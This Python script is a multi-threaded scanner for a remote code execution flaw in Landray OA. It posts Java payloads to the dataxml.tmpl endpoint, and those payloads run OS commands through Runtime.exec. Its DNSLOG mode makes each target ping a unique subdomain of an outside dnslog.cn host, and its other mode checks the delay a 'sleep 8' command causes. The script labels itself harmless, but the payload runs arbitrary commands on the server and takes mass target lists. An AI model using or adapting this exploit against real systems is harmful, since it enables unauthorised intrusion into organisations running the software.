import requests
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

DNSLOG = "d2tk10.dnslog.cn"

def check_by_dnslog(url, timeout=10):
    """DNSLOG方式检测 - 仅触发DNS请求"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    url = url.rstrip('/')
    
    target = f"{url}/ekp/data/sys-common/dataxml.tmpl"
    
    # 生成唯一标识，方便区分目标
    import random
    import string
    uid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    domain = f"{uid}.{DNSLOG}"
    
    # Windows和Linux兼容的ping
    payload = f"""s_bean=ruleFormulaValidate&script=try {{
    String os = System.getProperty("os.name").toLowerCase();
    String cmd = "";
    if (os.contains("win")) {{
        cmd = "ping -n 1 {domain}";
    }} else {{
        cmd = "ping -c 1 {domain}";
    }}
    Process child = Runtime.getRuntime().exec(cmd);
    }} catch (IOException e) {{
    System.err.println(e);
}}"""
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
        'Accept': '*/*'
    }
    
    try:
        resp = requests.post(target, data=payload, headers=headers, timeout=timeout, verify=False)
        return {
            'url': url,
            'domain': domain,
            'status': resp.status_code,
            'success': True,
            'error': None
        }
    except Exception as e:
        return {
            'url': url,
            'domain': domain,
            'status': None,
            'success': False,
            'error': str(e)
        }

def check_by_sleep(url, timeout=15):
    """Sleep延时方式检测 - 通过响应时间判断"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    url = url.rstrip('/')
    
    target = f"{url}/ekp/data/sys-common/dataxml.tmpl"
    
    baseline = """s_bean=ruleFormulaValidate&script=try {
    String cmd = "echo test";
    Process child = Runtime.getRuntime().exec(cmd);
    } catch (IOException e) {
    System.err.println(e);
}"""
    
    sleep_payload = """s_bean=ruleFormulaValidate&script=try {
    String cmd = "sleep 8";
    Process child = Runtime.getRuntime().exec(cmd);
    } catch (IOException e) {
    System.err.println(e);
}"""
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close'
    }
    
    try:
        # 基线请求
        start = time.time()
        resp1 = requests.post(target, data=baseline, headers=headers, timeout=5, verify=False)
        baseline_time = time.time() - start
        
        # Sleep请求
        start = time.time()
        resp2 = requests.post(target, data=sleep_payload, headers=headers, timeout=20, verify=False)
        sleep_time = time.time() - start
        
        # 如果sleep比基线慢5秒以上，可能存在漏洞
        is_vuln = (sleep_time - baseline_time) > 5
        
        return {
            'url': url,
            'baseline': round(baseline_time, 2),
            'sleep_time': round(sleep_time, 2),
            'diff': round(sleep_time - baseline_time, 2),
            'vulnerable': is_vuln,
            'status': resp2.status_code,
            'error': None
        }
    except Exception as e:
        return {
            'url': url,
            'vulnerable': False,
            'error': str(e)
        }

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='蓝凌OA RCE检测 (无害)')
    parser.add_argument('-f', '--file', help='URL列表文件')
    parser.add_argument('-u', '--url', help='单个目标URL')
    parser.add_argument('-t', '--threads', type=int, default=5, help='线程数')
    parser.add_argument('--dnslog', action='store_true', help='使用DNSLOG方式')
    parser.add_argument('--sleep', action='store_true', help='使用Sleep延时方式')
    parser.add_argument('--timeout', type=int, default=10, help='超时时间')
    
    args = parser.parse_args()
    
    # 获取目标列表
    targets = []
    if args.file:
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    elif args.url:
        targets = [args.url]
    else:
        print("请指定 -f 或 -u")
        sys.exit(1)
    
    # 默认使用sleep方式
    use_dnslog = args.dnslog
    use_sleep = args.sleep or not use_dnslog
    
    print(f"[*] 目标数量: {len(targets)}")
    print(f"[*] DNSLOG: {DNSLOG}")
    print(f"[*] 检测方式: {'DNSLOG' if use_dnslog else 'Sleep延时'}")
    print("="*50)
    
    results = []
    vulnerable = []
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for target in targets:
            if use_dnslog:
                futures.append(executor.submit(check_by_dnslog, target, args.timeout))
            else:
                futures.append(executor.submit(check_by_sleep, target, args.timeout + 10))
        
        for future in as_completed(futures):
            result = future.result()
            results.append(result)
            
            if result.get('error'):
                print(f"[-] {result['url']} - 错误: {result['error']}")
            elif use_dnslog:
                print(f"[*] {result['url']} - 状态码: {result['status']} - DNS: {result['domain']}")
                # DNS方式需要手动查DNSLOG，先记录
                vulnerable.append(result['url'])
            else:
                if result.get('vulnerable'):
                    print(f"[+] {result['url']} - 可能存在漏洞! (延迟: {result['diff']}s)")
                    vulnerable.append(result['url'])
                else:
                    print(f"[-] {result['url']} - 安全 (延迟: {result.get('diff', 0)}s)")
    
    print("="*50)
    print(f"[*] 检测完成! 共检测 {len(targets)} 个目标")
    
    if use_dnslog:
        print(f"[*] 请访问 http://{DNSLOG} 查看DNS记录")
        print("[*] 如果看到对应的子域名记录，说明存在漏洞")
        print("\n生成的子域名列表:")
        for r in results:
            if r.get('domain'):
                print(f"  - {r['domain']}")
    else:
        if vulnerable:
            print(f"\n[+] 发现 {len(vulnerable)} 个可能存在漏洞的目标:")
            for v in vulnerable:
                print(f"  - {v}")
        else:
            print("\n[-] 未发现漏洞目标")

if __name__ == "__main__":
    main()